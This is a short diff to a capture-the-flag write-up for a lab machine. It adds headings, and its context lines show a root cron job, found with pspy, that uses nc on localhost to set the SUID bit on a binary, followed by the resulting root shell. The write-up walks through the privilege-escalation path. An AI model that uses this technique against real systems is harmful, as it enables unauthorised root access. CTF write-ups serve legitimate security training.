@@ -175,7 +175,8 @@ user.txt
  helder@ripper:/tmp$chmod +x pspy64 && ./pspy64 
  CMD: UID=0    PID=12824  | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
  ```
- We can see that this is running every minute
+We can see that this is running every minute
+
 ##Exploit
  
  ```bash
@@ -189,6 +190,9 @@ helder@ripper:/tmp$ls -alh /usr/bin/bash
 helder@ripper:/tmp$id
 uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
 helder@ripper:/tmp$cd /root/
+```
+#Root Flag
+```bash
 helder@ripper:/root$ls
 root.txt
 ```
